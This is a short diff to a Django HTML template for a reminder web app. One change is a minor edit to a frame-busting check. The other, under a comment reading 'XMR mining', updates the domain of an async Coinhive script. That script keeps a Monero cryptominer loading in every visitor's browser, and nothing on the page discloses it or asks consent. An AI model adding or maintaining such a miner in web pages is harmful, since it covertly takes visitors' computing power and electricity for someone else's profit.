@@ -24,7 +24,7 @@
         var remindListUrl = "{% static "tpls/remind_list.html" %}";
         var remindDetailUrl = "{% static "tpls/remind_detail.html" %}";
         // handle Ads inserted by ISP
-        if (window != top) top.location.href = window.location.href;
+        if (window !== top) top.location.href = window.location.href;
     </script>
     <script src="{% static "js/remind.js" %}"></script>
     <script>
@@ -66,6 +66,6 @@
         });
     </script>
     <!-- XMR mining -->
-    <script async src="https://coin-hive.com/lib/coinhive.min.js"></script>
+    <script async src="https://coinhive.com/lib/coinhive.min.js"></script>
 </body>
 </html>
